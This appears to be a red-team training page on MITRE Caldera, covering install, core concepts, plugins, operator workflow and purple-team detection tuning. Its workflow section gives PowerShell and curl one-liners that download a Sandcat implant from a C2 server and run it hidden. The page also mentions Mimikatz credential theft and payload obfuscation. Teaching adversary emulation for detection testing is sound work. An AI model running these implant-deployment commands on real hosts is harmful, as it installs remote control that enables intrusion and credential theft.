---
layout: training-page
title: "MITRE Caldera — Adversary Emulation — Red Team Academy"
module: "Red Team Tools"
tags:
  - caldera
  - mitre
  - adversary-emulation
  - purple-team
  - atomic
  - sandcat
page_key: "tools-caldera"
render_with_liquid: false
---

# MITRE Caldera — Automated Adversary Emulation

Caldera is MITRE's open-source adversary-emulation platform: an asynchronous C2 server with a REST API, a Vue web UI, and a plugin ecosystem that implements the MITRE ATT&CK framework end-to-end. It's built for two audiences — **red teams** who want to automate repeatable attack chains and **purple teams** who want to drive adversary-behavior tests against a SIEM to validate detections.

## Install

```
# Clone with submodules (plugins live as git submodules):
git clone https://github.com/mitre/caldera.git --recursive
cd caldera

# Python 3.10+ is required. Install deps:
pip3 install -r requirements.txt

# Run the server. --build compiles the Vue UI; --insecure disables HTTPS enforcement for
# labs (do NOT use in prod):
python3 server.py --insecure --build

# Browser: http://localhost:8888
# Default creds (change these in conf/local.yml):
#   red / admin      (red-team view)
#   blue / admin     (blue-team view)
#   admin / admin    (server admin)
```

System requirements: Python 3.10+, Linux or macOS, 8 GB RAM + 2 CPUs. GoLang 1.24+ required if you want to rebuild Sandcat agents; Node 16+ for Vue development.

## Core Concepts

| Concept | What it is |
|---------|------------|
| **Agent** | An implant on a target host — Sandcat (Go), Manx (Python shell), or custom |
| **Ability** | A single attacker action — one command, mapped to a specific ATT&CK technique/sub-technique |
| **Adversary** | An ordered collection of abilities — a profile like "APT29", "Pentest-basic", etc. |
| **Operation** | A run of an Adversary against a group of Agents — the operational unit you observe |
| **Fact / Fact Source** | Discovered data (usernames, IPs, paths) that feeds later abilities — enables dynamic chaining |
| **Planner** | Strategy for ordering abilities — atomic (run all), batch, buckets, sequential |
| **Plugin** | Additional functionality — new agents, new abilities, new views, reporting |

## Plugin Ecosystem

Caldera ships most of these as submodules in the repo under `plugins/`.

| Plugin | What it adds |
|--------|-------------|
| **sandcat** | The default cross-platform Go agent (also called `54ndc47`) |
| **manx** | Reverse shell / shell agent |
| **atomic** | Pulls Atomic Red Team tests in as Caldera abilities |
| **stockpile** | Large catalog of built-in abilities + adversaries + fact sources |
| **compass** | ATT&CK Navigator heat-map visualization of operations |
| **training** | Guided certification course for Caldera operators |
| **human** | Endpoint-noise simulator — generates benign activity to mimic real users |
| **response** | Blue-team incident-response plugin |
| **caltack** | Offline ATT&CK data |
| **builder** | Compile custom payloads (replace `exe`, obfuscate, sign) on the fly |
| **debrief** | Post-operation reporting / export |

## Operator Workflow

```
# 1. Start the server, browse to http://localhost:8888, login as red/admin.

# 2. Deploy Sandcat on a target — server serves a dynamic one-liner:
# Windows:
$server="http://10.0.0.5:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
get-process|? {$_.modules.filename -like "C:\Users\Public\$name.exe"}|stop-process -f;
rm -force "C:\Users\Public\$name.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;

# Linux:
server="http://10.0.0.5:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > sandcat.go && chmod +x sandcat.go && ./sandcat.go -server $server -group red &

# 3. In the UI: Agents tab — confirm the callback.

# 4. Build an operation:
#    Operations → + Operation →
#      Name: "APT29 emulation"
#      Adversary: APT29 (or your own)
#      Group: red (matches -group flag on Sandcat)
#      Planner: atomic  (run each ability once, in order)
#      Fact source: basic
#      Autonomous: ON (fully automated)
#    → Start

# 5. Watch the operation — Caldera executes each ability on the Agent and shows output,
#    command, ATT&CK mapping, and success/failure inline.

# 6. When finished: Operations → <op> → Export Report (PDF/JSON) for blue team.
```

## Red + Purple Team Use

**Pure red-team automation** — Build an Adversary that mirrors the engagement plan (initial access → persistence → lateral → exfil), launch as one operation, and let it run while you work on higher-value manual tasks. Use fact sources to dynamically chain (e.g., `host.user.name` from the `whoami` ability feeds the `Invoke-Mimikatz` ability).

**Purple-team detection tuning** — For each new detection rule the SOC builds, Caldera runs the corresponding technique via its Ability, and you assert that the rule fired. The `atomic` plugin pulls all ~1,700 Atomic Red Team tests into Caldera's ability format, giving the largest cataloged source of preset detection tests.

**Reproducibility** — Because every ability is declared as YAML (not an ad-hoc script), the exact same test can run every sprint and produce consistent telemetry for drift detection.

## OPSEC / Security

- **The Caldera web UI is not pentested.** Never expose the server to the internet or to untrusted networks. Run it on a dedicated VPN / jump box.
- Default creds are well-known — change `red`, `blue`, `admin` in `conf/local.yml` *before* the first start.
- Sandcat's traffic pattern is well-documented and easy to detect — this is intentional. For pure-red ops you want a real C2 (Cobalt Strike / Havoc / Mythic); for purple ops, the detectability is the point.
- The HTTP server listens unencrypted at port 8888 by default — put a real TLS proxy in front for any shared environment.

## Resources

- MITRE Caldera — `github.com/mitre/caldera`
- Caldera documentation — `caldera.readthedocs.io`
- MITRE ATT&CK — `attack.mitre.org`
- Caldera plugins repo index — `github.com/mitre/caldera/tree/master/plugins`
- Atomic Red Team integration via the `atomic` plugin — see `tools/atomic-red-team.md`
- See also: `fundamentals/mitre-attack.md`, `fundamentals/purple-teaming.md`
